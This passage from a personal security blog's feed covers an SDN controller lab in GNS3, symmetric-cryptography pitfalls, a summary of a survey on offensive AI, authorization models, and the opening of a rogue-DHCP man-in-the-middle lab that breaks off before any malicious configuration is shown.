<p>Then, to start the controller process run the following command in the host machine in the terminal where <code class="language-plaintext highlighter-rouge">venv</code> is active: <code class="language-plaintext highlighter-rouge">ryu-manager --verbose controller.py</code> . The logs in the terminal should indicate that the switch registered itself with the controller and is receiving <code class="language-plaintext highlighter-rouge">PacketIn</code> events from the switch.</p>

<p><img src="/assets/img/gns-sdn/fig4.png" alt="Figure 4: RYU controller process and its logs" />
<br /><small style="color: gray">Figure 4: RYU controller process and its logs</small><br /></p>

<h2 id="explanation">Explanation</h2>

<p>RYU is built on an event-based framework. The above code responds to two events: <code class="language-plaintext highlighter-rouge">SwitchFeatures</code> and <code class="language-plaintext highlighter-rouge">PacketIn</code> events. The <code class="language-plaintext highlighter-rouge">SwitchFeatures</code> event is triggered by the switch when it registers itself with the controller. The <code class="language-plaintext highlighter-rouge">PacketIn</code> event is triggered by the switch when it sees a packet that does not match any flow rule but the fallback rule. The fallback rule is set during the registration phase of the switch (as implemented in <code class="language-plaintext highlighter-rouge">switch_features_handler</code> function). While, for each packet flowing in the data plane the <code class="language-plaintext highlighter-rouge">packet_in_handler</code> function is called. The controller instructs the switch to broadcast the packet (as <code class="language-plaintext highlighter-rouge">actions</code> variable in <code class="language-plaintext highlighter-rouge">packet_in_handler</code> function) to all the ports other than the port in which the packet was received i.e. <code class="language-plaintext highlighter-rouge">in_port</code></p>

<h2 id="verification">Verification</h2>

<p>Now, ping <code class="language-plaintext highlighter-rouge">PC2</code> from <code class="language-plaintext highlighter-rouge">PC1</code> and vice-versa. Observe that the two hosts are able to communicate with each other, as shown in Figure 5 (Unlike shown in Figure 2).</p>

<p><img src="/assets/img/gns-sdn/fig5.png" alt="Figure 5: The PCs will be able to ping each other" />
<br /><small style="color: gray">Figure 5: The PCs will be able to ping each other</small><br /></p>

<p>Further, in the GNS3 UI right click on the link connecting the NAT and the Open vSwitch, and select capture packets. Then, run ping from one of the PCs to the other PC. Observe that there are OpenFlow packets surrounding the ICMP request and reply packets that makes the communication between PCs possible.</p>

<blockquote>
  <p>Think: Why does the link connecting NAT and Open vSwitch see ICMP packets between the two PCs?</p>
</blockquote>

<p><img src="/assets/img/gns-sdn/fig6.png" alt="Figure 6: Snippet of wireshark packet capture" />
<br /><small style="color: gray">Figure 6: Snippet of wireshark packet capture</small><br /></p>

<h2 id="conclusion">Conclusion</h2>

<p>The above blog article demonstrates the usage of GNS3 to setup, build and simulate SDN networks. To build a multi-switch topology one could use a standard ethernet switch to connect the NAT to all the Open vSwitches, as shown in Figure 7.</p>

<p><img src="/assets/img/gns-sdn/fig7.png" alt="Figure 7: Topology idea for multiple Open vSwitches" />
<br /><small style="color: gray">Figure 7: Topology idea for multiple Open vSwitches</small><br /></p>

<p>The controller code used here performs no more than the job of a network hub. I would strongly suggest you to learn how to develop a controller that performs L2 switching. Further, learn how to develop a controller that performs L3 switching. What about a controller that manages a cluster of switches performing L2 and L3 switching?</p>]]></content><author><name></name></author><category term="intermediate" /><category term="application" /><category term="sdn" /><category term="cloud" /><category term="networking" /><category term="featured" /><summary type="html"><![CDATA[Setup and configure your GNS3 with required elements to learn, develop and test Software Defined Networks.]]></summary></entry><entry><title type="html">What can go wrong in a cryptographic system</title><link href="https://www.kmmanoj.me/2022/10/30/what-can-go-wrong-in-a-cryptographic-system.html" rel="alternate" type="text/html" title="What can go wrong in a cryptographic system" /><published>2022-10-30T00:00:00-04:00</published><updated>2022-10-30T00:00:00-04:00</updated><id>https://www.kmmanoj.me/2022/10/30/what-can-go-wrong-in-a-cryptographic-system</id><content type="html" xml:base="https://www.kmmanoj.me/2022/10/30/what-can-go-wrong-in-a-cryptographic-system.html"><![CDATA[<p>Recall, cryptography is the study of techniques to securely exchange information between sender and an intended recipient. Encryption is the act of converting plain text into cipher text based on the input key and one or more parameters that make the cipher text non-deterministic. While, decryption is the act of converting a given cipher text back to plain text based on the key that was used for encryption to evaluate the cipher text.</p>

<h2 id="how-cryptographic-systems-work">How cryptographic systems work?</h2>

<p><em>The scope of this article is limited to symmetric key block cipher cryptography.</em></p>

<p>A <strong>key</strong>, which is known both to the sender and the receiver is used as an input to a <strong>block cipher</strong>. A block cipher can be thought of as a function that takes message block and key as input and returns a (pseudo-)random string of 0s and 1s as output. (“Pseudo-“ random, because during the decryption process this string with the key should return the message block back). The message that needs to be transferred securely is broken down into blocks of specific size known as the block size. The last block is <strong>padded</strong> to fit the <strong>block size</strong>. Each message block is optionally-preprocessed using “some <strong>randomization”</strong>. The processed message block is the other input to the block cipher. The output of the block cipher is a part of the cipher text. A <strong>mode</strong> is defined that dictates how multiple block ciphers combine to provide the complete cipher text for the long message.</p>

<p><img src="/assets/img/crypto/enc.png" alt="Figure 1: General cryptographic system (Encryption)" />
<br /><small style="color: gray">Figure 1: General cryptographic system (Encryption)</small><br /></p>

<h3 id="example-aes-256-cbc-using-random-iv">Example: AES-256-CBC using random IV</h3>

<p><img src="/assets/img/crypto/aes-enc.png" alt="Figure 2: AES CBC with random IV (Encryption)" />
<br /><small style="color: gray">Figure 2: AES CBC with random IV (Encryption)</small><br /></p>

<p>The above image shows the block diagram of AES CBC using a random IV. Here,</p>

<ul>
  <li><strong>AES</strong> is the encryption algorithm used by the <strong>block cipher</strong>.</li>
  <li><strong>256</strong> is the <strong>key size</strong>. In other words, the length of the key is 256 bits.</li>
  <li><strong>CBC</strong> stands for Cipher Block Chaining mode. It is a <strong>mode</strong> wherein the previous cipher text block is used as randomization vector for the following block.</li>
  <li><strong>Random IV</strong> stands for <strong>random</strong> Initialization Vector. The initialization vector is chosen in random by the sender. This randomly chosen IV is used for preprocessing with the first message block.</li>
  <li>The block size for AES is 128 bits. Each message block and the Initialization Vector is 128 bits long.</li>
</ul>

<h2 id="it-is-easy-said-than-done">It is easy said than done!</h2>

<p>Now that we understand different building blocks of a cryptographic system and certain terminologies, let us now look into what can go wrong in such systems.</p>

<h3 id="the-block-cipher">The block cipher</h3>

<p>The concepts of Pseudo Random Function (PRF) and Pseudo Random Permutation (PRP) are key to understanding security of block ciphers. <a href="https://crypto.stanford.edu/~dabo/cs255/lectures/PRP-PRF.pdf#page=13">https://crypto.stanford.edu/~dabo/cs255/lectures/PRP-PRF.pdf#page=13</a></p>

<p>A block cipher (also known as PRP) is considered secure if it is indistinguishable from a PRF. The experiment focused on distinguishing the output as an output of a block cipher or that of a random function is known by the term Secure PRF test.
<a href="https://crypto.stanford.edu/~dabo/cs255/lectures/PRP-PRF.pdf#page=16">https://crypto.stanford.edu/~dabo/cs255/lectures/PRP-PRF.pdf#page=16</a></p>

<p>DES, 3DES and AES algorithms are considered to be PRF secure (As of October 30, 2022). However, DES is not used in practice due to its small key size.</p>

<h3 id="the-pesudo-random-generators">The pesudo random generators</h3>

<p>Pseudo random generators (PRGs) are functions that output series of 0s and 1s that can be reproducible, but at the same time random enough to disallow an adversary to reproduce it. Similar to block ciphers PRG functions accept a seed and a key to generate a streaming bit string. In fact, secure PRF block ciphers are used to generate random bit strings.</p>

<p>But, what happens if an adversary is able to guess the bit string generated by PRGs? Recall the use of “random” IV in certain modes of encryption. If the random IV is guessable then the fact of considering such encryption mode to be more secure than a mode that uses predefined IV is pointless.</p>

<h3 id="the-mode">The mode</h3>

<p>Similar to Secure PRF test for block ciphers and PRGs, modes are tested for Indistinguishably under Chosen Plain text Attack (IND-CPA) and Indistinguishably under Chosen Cipher text Attack (IND-CCA). This experiment focuses on identifying which of the two input message got encrypted based on the output cipher text returned by an “oracle” ( = E(K,.)) that encrypts one of the two input messages. Intuitively, it means that the experiment ensures that the cipher text does not leak any information regarding the input message(s).</p>

<p>Consider Electronic Code Book (ECB) mode. In this mode of operation, equal messages output the same cipher text. It implies that an adversary collecting a considerable amount of plain text-cipher text pairs can evaluate plain text for future cipher texts. The following slide shows the weakness of ECB mode. <a href="https://crypto.stanford.edu/~dabo/cs255/lectures/PRP-PRF.pdf#page=24">https://crypto.stanford.edu/~dabo/cs255/lectures/PRP-PRF.pdf#page=24</a>. Here is a working example guide for breaking AES ECB mode: <a href="https://cryptopals.com/sets/2/challenges/12">https://cryptopals.com/sets/2/challenges/12</a></p>

<p>With evolving security research new schemes are designed and broken, new provable security notions are developed continuously. However, for adoption by industry CBC mode, its variants or better are used. Even though there exists vulnerabilities and weakness in these schemes the exploitation of such systems are handled by the defense in depth, such as by the Intrusion Detection Systems and similar.</p>

<h3 id="the-keys">The keys</h3>

<p>Study of symmetric cryptography assumes that the sender and the receiver already have a shared secret. The shared secret is the key component of the symmetric cryptographic system. Compromise of the key implies compromise of the whole symmetric key cryptographic system.</p>

<p>The challenges that industry faces in terms of storing, using and exchanging keys securely is handled by asymmetric key cryptography and Key Management Systems domains.</p>

<h2 id="concluding-thoughts">Concluding thoughts</h2>

<p>In summary, the challenges faced by industry in using symmetric key cryptographic systems are:</p>

<ul>
  <li>Use of a secure proven block cipher, pseudo random generators and encryption/decryption modes.</li>
  <li>Handling and managing keys and other parameters (such as random IV) used in symmetric key encryption and decryption.</li>
</ul>

<p>The field of security is ever changing. It is demanding for organizations to keep up with the latest weaknesses and attacks on cryptographic system. Similar to any vulnerabilities and exploitation, the organization would first respond to it by installing detection rules in its monitoring and detection systems, develop (or) identify a patch to resolve the vulnerability, and develop and deploy the solution across all the subsystem of the organization. It takes days to months to control a vulnerability to its stable state depending on its severity and priority. However, the focus of the organization is to keep the business running while ensuring trust with its customers.</p>]]></content><author><name></name></author><category term="intermediate" /><category term="concept" /><category term="cryptography" /><category term="cybersecurity" /><category term="featured" /><summary type="html"><![CDATA[An enumeration and brief description of parameters that should be considered while designing and developing a secure cryptographic system]]></summary></entry><entry><title type="html">Threat of Offensive AI to organizations</title><link href="https://www.kmmanoj.me/2022/04/24/threat-of-offensive-ai-to-organizations.html" rel="alternate" type="text/html" title="Threat of Offensive AI to organizations" /><published>2022-04-24T00:00:00-04:00</published><updated>2022-04-24T00:00:00-04:00</updated><id>https://www.kmmanoj.me/2022/04/24/threat-of-offensive-ai-to-organizations</id><content type="html" xml:base="https://www.kmmanoj.me/2022/04/24/threat-of-offensive-ai-to-organizations.html"><![CDATA[<p>With Artificial Intelligence burgeoning various industries and fields, it is obvious that it would revolutionize cybersecurity some day. There are organizations that use AI to test, detect and auto-recover from adversaries. But, AI in cybersecurity is a double edged sword. The referenced paper says:</p>

<blockquote>
  <p>One caveat is that the ‘sword’ is not symmetric depending on the wielder. For example, generative AI (deepfakes) is better for the attacker, but anomaly detection is better for the defender.</p>
</blockquote>

<p>The following article summarizes the survey performed by top academicians and professionals in the field of cybersecurity on potential threats to an organization, be it industry or academia, due to offensive AI.</p>

<h2 id="introduction">Introduction</h2>

<p>For cybersecurity, AI is a double-edged sword. An adversary employs it to perform cyber attacks for better coverage and precision. While, a defender employs it to defend against new patterns of attacks, such as zero-days and to correlate and analyze massive amount of event logs in justifiable time.</p>

<p>It is observed that a threat actor would employ AI for attacks to achieve better coverage, speed and success. For instance, using AI-based tools the adversary would be able to analyze huge amount of OSINT information (coverage) to study about a spear phishing target at compute speed (speed) and launch an attack with a greater degree of success.</p>

<h2 id="offensive-ai-capabilities">Offensive AI capabilities</h2>

<p>The following content describes the capabilities of AI used by an adversary in various phases of a cyber kill chain, grouped into logical categories:</p>

<h3 id="automation">Automation</h3>

<p>Initially, an adversary may use deepfakes to synthesize seemingly genuine media for phishing campaigns. Further, in identifying the best point of entry to get initial foothold, next hop targeting to gain persistence, and attack coordination among nodes of the botnet for an impactful and anonymous attack. AI is capable of adapting attack to the difference in it’s interactions and the environment. On the other hand, AI is capable of tampering records such as health information or case evidences to favor the adversary.</p>

<h3 id="campaign-resilience">Campaign resilience</h3>

<p>AI-based tools can be used to plan phishing campaigns by analyzing huge amount of OSINT information of a potential spear phishing target. Further, it can be used to obfuscate malware to hamper analysis. On getting initial foothold, it can be used to identify methods to hold persistent access, and further to detect virtualization to escape into the host machine and to auto-analyze the new and unknown environment to gain further access.</p>

<h3 id="credential-theft">Credential theft</h3>

<p>AI-based tools can be used to spoof biometric information to bypass authentication and authorization. On gaining initial foothold, it may employ use of an implicit key logger that determines key-presses based on eye-motions, keypad sounds or vibration of nearby surfaces due to the key press, to determine credentials. AI may also be employed to guess passwords intelligently than a mere wordlist (or, a generator using pattern), and to mine cache and analyze binaries for presence of credentials. Side channel mining can also be powered by AI that identifies minute differences in metrics such as network time, processing time, and power consumption to identify valid credentials.</p>

<h3 id="exploit-development">Exploit development</h3>

<p>An adversary may use AI to reverse engineer compiled binaries to analyze and understand proprietary code. He/She may also use AI to detect (new) vulnerabilities in the software(s) installed in the compromised system to exploit and gain further access.</p>

<h3 id="information-gathering">Information gathering</h3>

<p>Using technologies such as speech to text, and object recognition an adversary may spy on a target. Also, an adversary may use AI-based tools to mimic a web crawler, and translate foreign languages using NLP to mine OSINT. On the other hand, with ML models serving customer requests, an adversary may employ AI to fuzz and enumerate the parameters and hyper-parameters to steal the ML model to compromise confidentiality and for exploitation later.</p>

<h3 id="social-engineering">Social engineering</h3>

<p>Deepfakes can be used for impersonation. AI can also be used to build a persona online to evade fake profile detectors. Further, AI can be used to select a target and perform spear phishing, such as using deepfakes to coax an employee to perform an action that favors the adversary. Further, it can be used to track staff, such as location, to identify hidden business relationships.</p>

<h3 id="stealth">Stealth</h3>

<p>To gain persistence and further access an adversary needs to evade defenses setup in the organization systems. AI can be used to evade HIDS, and NIDS to ensure persistent access to the system. To gain further access through social engineering, it may be employed to create malwares to evade email filters. On the other hand, it can be used to profile usage and analyze the owner of the credentials to evade insider detectors, and profile and analyze the network traffic of the compromised machine to perform scanning and propagation without turning up the alerts. Similarly, it may use seemingly usual traffic such as a Facebook chat message to exfiltrate data. Finally, AI may be employed to identify and remove abnormal log events in detection systems to cover it’s tracks.</p>

<h3 id="survey-results-and-conclusion">Survey results and conclusion</h3>

<p>The capabilities are ranked based on Profit (P), Achievability (A), Defeatability (D) and Harm (H) as:</p>

<p><code class="language-plaintext highlighter-rouge">Threat score = H * R</code></p>

<p>where, Risk R is calculated as ratio between Motivation M and Defeatability D, and M is calculated as the average of Profit and Achievability scores.</p>

<p>It is observed that industry and academia do not agree on similar ranks of threats. The industry are concerned about reverse engineering, impersonation and AI model thefts as their top three threats, while academia observes them to be biometric spoofing, impersonation and spear phishing. However, both agree upon stealth as the least threatening AI capability.</p>

<p>AI is easily accessible and research developments around them are in rapid pace. Hence, one may expect rise in the use of AI for cyber attacks in the near future. To defend against such attacks, the defences are forced to use AI powered automation. Therefore, keeping a human informed about the happenings in such hyper-automation systems needs further research.</p>

<p>The researchers recommend use of post-processing tools such as anti-vulnerability detection, to train employees and staffs about identifying AI-powered social engineering attacks and to embrace MLSecOps.</p>

<h2 id="conclusion">Conclusion</h2>

<p>It is indeed unjustifiable to claim that this 5 min blog article covers the 31-page content of the survey. I highly recommend readers to read the research paper to get a detailed understanding.</p>

<h2 id="reference">Reference</h2>

<p>[1] Mirsky, Y., Demontis, A., Kotak, J., Shankar, R., Gelei, D., Yang, L., Zhang, X., Lee, W., Elovici, Y., and Biggio, B.. (2021). The Threat of Offensive AI to Organizations. <a href="https://arxiv.org/abs/2106.15764">https://arxiv.org/abs/2106.15764</a></p>]]></content><author><name></name></author><category term="intermediate" /><category term="concept" /><category term="AI-ML" /><category term="cybersecurity" /><summary type="html"><![CDATA[A summary of the survey that describes how AI can be used by adversaries to enhance their cyber attacks]]></summary></entry><entry><title type="html">How complex can Authorization get?</title><link href="https://www.kmmanoj.me/2022/03/20/how-complex-can-authorization-get.html" rel="alternate" type="text/html" title="How complex can Authorization get?" /><published>2022-03-20T00:00:00-04:00</published><updated>2022-03-20T00:00:00-04:00</updated><id>https://www.kmmanoj.me/2022/03/20/how-complex-can-authorization-get</id><content type="html" xml:base="https://www.kmmanoj.me/2022/03/20/how-complex-can-authorization-get.html"><![CDATA[<p><strong>I</strong>dentity and <strong>A</strong>ccess <strong>M</strong>anagement system deals with “who” should get “what” level of access to an object (entity) or a function. The subsystem that defines “who” is called <strong>Authentication</strong> (Identity), while the subsystem that defines “what” level of access is called <strong>Authorization</strong> (Access).</p>

<p>Building an IAM system can get very complex quickly. No wonder “Broken Authentication” and “Broken Authorization” are listed in <a href="https://owasp.org/www-project-top-ten/">OWASP Top Ten WebApp Security risks</a> and <a href="https://owasp.org/www-project-api-security/">OWASP Top Ten API Security risks</a>. Security risks in IAM system arises due to flawed or missed logic, or due to gap in the implementation and design due to it’s complexity.</p>

<p>This article explains the evolution of the Authorization component of an IAM system with the growth of the software. Let us consider a content management system for example while we build it up. Here,</p>

<ul>
  <li>Let <em>V1</em> be the visitor (unauthenticated) user, and <em>M1 … M3</em> be the member (authenticated) users.</li>
  <li>Let <em>B1 … B5</em> be the Blog entities</li>
  <li>Let Read (R), Write (W) and Like (L) be the actions that can be performed on the entities</li>
</ul>

<p>The notation:</p>

<p><code class="language-plaintext highlighter-rouge">{u, v} can {a, b} on {m, n}</code></p>

<p>Implies, a nested Cartesian product:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{Set of users} can (perform) {Set of actions} on {Set of Entities}

u can a on m, u can a on n, 
u can b on m, u can b on n, 
v can a on m, v can a on n, 
v can b on m, v can b on n
</code></pre></div></div>

<h2 id="unprotected-systems">Unprotected systems</h2>

<p>Let us begin from zero. A system in which anyone has access to anything. There is no authentication nor authorization in place. A system with such characteristics defines the starting point for IAM. IAM does not exist or does nothing in such a system.</p>

<p>The CMS in this state has all the blogs readable, writable and like-able by any visitor and/or member.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{V1, M1, M2, M3} can {R, W, L} on {B1, B2, B3, B4, B5}
</code></pre></div></div>

<h2 id="all-or-nothing">All-or-Nothing</h2>

<p>In such systems, there are two access levels for entities: public and private. Certain entities may be tagged public which implies that this entity can be acted upon by any user. While, certain entities can be tagged private which implies that this entity can be acted only upon by a specific user. To identify a specific user authentication is required.</p>

<p>Let, blog <em>B1</em> be a private blog to <em>M1</em>, <em>B2</em> be a private blog to <em>M2</em> while the rest be public. Then,</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{V1, M1, M2, M3} can {R, W, L} on {B3, B4, B5}, or
{M1} can {R, W, L} on {B1}, or
{M2} can {R, W, L} on {B2}
</code></pre></div></div>

<h2 id="controlled-sharing">Controlled Sharing</h2>

<p>This is where IAM starts to become complex. To enable collaboration and feedback, restricting access levels for entities to only public and private may not be valuable. To better understand the build up of controlled sharing let us break it down into the multiple sub-phases.</p>

<h3 id="controlled-sharing-all-or-nothing">Controlled Sharing: All-or-Nothing</h3>

<p>Customers of CMS complain that private blogs are too restrictive. They want to be able to share the blog(s) only to a certain specific set of users for collaboration.</p>

<p>In such systems, there are three access levels for entities: public, shared and private. Public and private continue to hold the definitions from All-or-Nothing system. A shared entity is an entity that can be acted upon only by a specific set of users.</p>

<p>Let <em>B1</em> be a private blog to <em>M1</em>, <em>B2</em> be a private blog to <em>M2</em>, <em>B3</em> be a shared blog to <em>M2</em> and <em>M3</em>, while the rest be public. Then,</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{V1, M1, M2, M3} can {R, W, L} on {B4, B5}, or
{M1} can {R, W, L} on {B1}, or
{M2} can {R, W, L} on {B2, B3}, or
{M3} can {R, W, L} on {B3}
</code></pre></div></div>

<h3 id="nested-controlled-sharing">Nested Controlled Sharing</h3>

<p>Customers now complain of shared blogs being too open to the authorized set of users. They want to be able to restrict the set of actions a specific subset of the authorized users can perform. For example, “while I have full access to the blog, I want my peer(s) to only read it and not be able to edit it.”</p>

<p>In such systems, there again exists three levels of access: public, private and shared, with private and public continuing to hold it’s definition from All-or-Nothing system. The shared access level, which used to deal with only one parameter i.e Entity, now deals with two parameters i.e. Action and Entity.</p>

<blockquote>
  <p>The (Action, Entity) tuple is called a <strong>permission</strong>.</p>
</blockquote>

<p>Let <em>B1</em> be a private blog to <em>M1</em>, <em>B2</em> be a private blog to <em>M2</em>, <em>B3</em> be a shared blog to <em>M2</em> and <em>M3</em>, with <em>M2</em> having the ability to perform only <em>R</em>, and <em>L</em> actions, while <em>M3</em> be able to perform <em>R</em>, <em>W</em> and <em>L</em> actions on it. Meanwhile, let the rest of the entities be public. Then,</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{V1, M1, M2, M3} can {R, W, L} on {B4, B5}, or
{M1} can {R, W, L} on {B2}, or
{M2} can {R, W, L} on {B2}, or
{M2} can {R, L} on {B3}, or
{M3} can {R, W, L} on {B3}
</code></pre></div></div>

<h3 id="dynamic-nested-controlled-sharing">Dynamic Nested Controlled Sharing</h3>

<p>All this while we have been looking at static rules to define authorization. It would be unmanageable and cumbersome to contact the service provider to edit the authorization rules with new entities, new users and new requirements (changing users/entities).</p>

<p>This introduces a new action, Grant (G), on actions that can be performed on an entity. For example, Grant Read (GR) is defined as the ability to grant read access to the entity in reference to any other user.</p>

<p>Consider the same scenario as mentioned in the Nested Controlled Sharing case. The new set of authorization rules would then be,</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{V1, M1, M2, M3} can {R, W, L, GR, GW, GL} on {B4, B5}, or
{M1} can {R, W, L, GR, GW, GL} on {B2}, or
{M2} can {R, W, L, GR, GW, GL} on {B2}, or
{M2} can {R, L} on {B3}, or
{M3} can {R, W, L, GR, GW, GL} on {B3}
</code></pre></div></div>

<h3 id="conclusion-on-controlled-sharing">Conclusion on Controlled Sharing</h3>

<p>At this point, it is worth mentioning about different Access Control schemes.</p>

<ul>
  <li><strong>Discretionary Access Control (DAC)</strong>: The owner (creator) of the entity possess grant permissions (Recall, permission is (Action, Entity) tuple). For example, in the CMS system with <code class="language-plaintext highlighter-rouge">{V1, M1, M2, M3}</code> users, <code class="language-plaintext highlighter-rouge">{R, W, L}</code> actions and <code class="language-plaintext highlighter-rouge">{}</code> blogs, when <em>M1</em> creates a blog <em>B1</em>, the authorization rules are:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{V1, M1, M2, M3} can {R, W, L, GR, GW, GL} on {}, or
{M1} can {R, W, L, GR, GW, GL} on {B1}
</code></pre></div></div>

<ul>
  <li><strong>Mandatory Access Control (MAC)</strong>: A specific administrator has access to grant permissions. For example, in the CMS system with <code class="language-plaintext highlighter-rouge">{V1, M1, M2, M3}</code> users, <code class="language-plaintext highlighter-rouge">{R, W, L}</code> actions and <code class="language-plaintext highlighter-rouge">{}</code> blogs, and M1 being the administrator, when <em>M2</em> creates a blog <em>B1</em>, the authorization rules are:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{V1, M1, M2, M3} can {R, W, L, GR, GW, GL} on {}, or
{M1} can {GR, GW, GL} on {B1}
{M2} can {R, W, L} on {B1}
</code></pre></div></div>

<ul>
  <li><strong>Role-Based Access Control (RBAC)</strong>: A complex access control scheme that includes Role as an Entity, in addition to blog. The actions on the Role are: assume (A) (For simplicity) (Other actions on the role includes read, write, update, delete etc.). Similar to any other actions, assume action can also be granted (GA). In this scheme, a user/role cannot act independently on entities. A user can independently only assume a role. A user on assuming a role can act on an entity, including another role. For example, in the CMS system with <code class="language-plaintext highlighter-rouge">{V1, M1, M2, M3}</code> users, <code class="language-plaintext highlighter-rouge">{R, W, L}</code> actions on blogs and <code class="language-plaintext highlighter-rouge">{A}</code> actions on roles, <code class="language-plaintext highlighter-rouge">{}</code> blogs and <code class="language-plaintext highlighter-rouge">{R1, R2}</code> roles. Let <em>R1</em> be a role that can perform anything to any role, while <em>R2</em> be a role that can perform anything on any blog. Let <em>R1</em> be assumable only by <em>M1</em>, <em>R2</em> be assumable by any authenticated user, <em>M2</em> assumes <em>R2</em> and creates a blog <em>B1</em>.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{R1} can {GA} on {R1, R2}
{R2} can {R, W, L, GR, GW, GL} on {B1}, or
---
{V1} can {R, W, L, A} on {}, or
{M1, M2, M3} can {R, W, L} on {}, or
{M1, M2, M3} can {A} on {R2}, or
{M1} can {A} on {R1}
</code></pre></div></div>

<h2 id="user-programmed-controlled-sharing">User-programmed controlled sharing</h2>

<p>So far we have been looking at permissions to those entities that are stored. Consider the case when the CMS wants to display the total number of blogs that exists in their system be it public, shared or private to any visitor/member. Further, it wants to display the total number of public, private and shared blogs individually. Though a visitor (unauthenticated) user is not allowed to access the private and shared blogs, he/she should be able to see the above statistics. Moreover, these statistics may or may not be stored. It may be calculated on demand. Access control to such “actions” on such “entities” are categorized into User-programmed controlled sharing.</p>

<blockquote>
  <p>Hence there exists two different security risks in OWASP top ten, namely: Broken “object” level authorization and broken “function” level authorization.</p>
</blockquote>

<p><strong>Attribute Based Access Control (ABAC)</strong> is an access control scheme that involves user-programmed controlled sharing. Consider the case when access to a specific object is given only during a certain time period, say between 9 am to 5 pm IST. And/Or, access to a specific object is given only when the user is located in a specific area, say in a circle with center at <code class="language-plaintext highlighter-rouge">(37.7858846, -122.4074781)</code> coordinates and radius <code class="language-plaintext highlighter-rouge">250 m</code>.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Designing an access control system highly depends on the customer’s needs. Most mature products have dynamic nested controlled sharing capabilities while there are certain features that uses User-programmed controlled sharing. However, critical systems such as military, government, healthcare and finance technology software do have advanced access control systems implemented and enforced. One such advanced access control is “Separation of duty”: A single user cannot individually execute a critical action.</p>

<p>The complexity in designing an access control system is present in identifying:</p>

<ul>
  <li>The access control scheme (DAC, MAC, RBAC, ABAC, hybrid or custom?)</li>
  <li>The entities and the granularity to which it needs to be access controlled</li>
  <li>The actions that can be performed on the entity</li>
  <li>The storage schema for the identified entities, actions, and users</li>
  <li>Sequence flow to perform authorization rule check, and</li>
  <li>Other system design choices</li>
</ul>

<h2 id="reference">Reference</h2>

<p>J. H. Saltzer and M. D. Schroeder, “<a href="https://ieeexplore.ieee.org/document/1451869">The protection of information in computer systems,</a>” in Proceedings of the IEEE, vol. 63, no. 9, pp. 1278–1308, Sept. 1975, doi: 10.1109/PROC.1975.9939.</p>]]></content><author><name></name></author><category term="intermediate" /><category term="concept" /><category term="IAM" /><category term="featured" /><summary type="html"><![CDATA[Builds on the Authorization component of Identity and Access Management system from zero to how systems implement today]]></summary></entry><entry><title type="html">Man-in-the-middle: A tale of a hoax DHCP server</title><link href="https://www.kmmanoj.me/2021/12/06/man-in-the-middle-a-tale-of-a-hoax-dhcp-server.html" rel="alternate" type="text/html" title="Man-in-the-middle: A tale of a hoax DHCP server" /><published>2021-12-06T23:00:00-05:00</published><updated>2021-12-06T23:00:00-05:00</updated><id>https://www.kmmanoj.me/2021/12/06/man-in-the-middle-a-tale-of-a-hoax-dhcp-server</id><content type="html" xml:base="https://www.kmmanoj.me/2021/12/06/man-in-the-middle-a-tale-of-a-hoax-dhcp-server.html"><![CDATA[<p>DHCP, Dynamic Host Configuration Protocol, is a network protocol that offers IP address and additional details such as the gateway IP and the DNS IP to a host requesting to be a part of the network. A detailed description of the protocol and its structure is documented in this wiki page. A DHCP server is a management server that maintains a pool of IP addresses, listens to requests for IP address from client joining the network and responds to them with an IP address offer on demand.</p>

<p>In a curious experiment where two independent DHCP servers are setup in the same physical network to observe how the system behaves led to an interesting outcome. This article explains the behavior of this system when two independently working DHCP servers are in the same physical network, how can a malicious user exploit by leveraging this opportunity, and what can network administrators do to prevent exploitation by this method.</p>

<h2 id="story">Story</h2>

<p>There was a peaceful network where clients frequently join and leave, and the DHCP server serves new incoming clients with IP address for them to be a part of the network. One day a rogue client entered the network. As a routine the DHCP server served the client an IP address. As soon as it set itself up, the rogue client began executing its evil plans. It claimed itself to be a DHCP server too! But poor clients! They have been taught that when they enter a network the one who serves them the IP address is the DHCP server. The rogue client is leveraging this principle to try and be the first one to present the client with an IP address. This way the rogue client can let the incoming client know that the gateway to the internet and the domain name resolution server is itself. But, in fact this rogue client is forwarding the requests to the actual gateway and DNS server of the network, which it learned from the genuine DHCP server thus fulfilling client’s communication needs. The rogue client has successfully set itself up as a man-in-the-middle, overhearing the client’s communication with the internet and possibly manipulating them in transit!</p>

<h2 id="setup">Setup</h2>

<p><img src="/assets/img/mitm-dhcp/setup.png" alt="Setup" />
<br /><small style="color: gray">Setup</small><br /></p>

<p>GNS3 is used in setting up the required infrastructure. Ubuntu docker containers are used as clients, while DHCP servers are Ubuntu docker containers with ISC DHCP server module installed. A simple switch is used to connect the four components of the network.</p>

<h3 id="the-genuine-dhcp-server">The genuine DHCP server</h3>

<ul>
  <li>Navigate to <code class="language-plaintext highlighter-rouge">/etc/dhcp</code> directory in the DHCP server console, once it starts up.</li>
  <li>Append the following contents to the <code class="language-plaintext highlighter-rouge">dhcpd.conf</code> file:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.150 192.168.1.160;
    option routers 192.168.1.1;
    option domain-name-servers 192.168.1.1;
    option domain-name "example.org";
}
</code></pre></div></div>

<ul>
  <li>Create an empty file, for the DHCP server to hold the leased IP addresses, by running the command: <code class="language-plaintext highlighter-rouge">touch /var/lib/dhcp/dhcpd.lease</code></li>
  <li>Then assign a static IP address(within the same subnet as in the DHCP configuration) to the primary network interface: <code class="language-plaintext highlighter-rouge">ifconfig eth0 192.168.1.1/24</code></li>
  <li>Finally, start the DHCP server by running: <code class="language-plaintext highlighter-rouge">dhcpd</code></li>
</ul>

<h3 id="the-malicious-dhcp-server">The malicious DHCP server</h3>

<p><img src="/assets/img/mitm-dhcp/mal.png" alt="" /></p>

<ul>
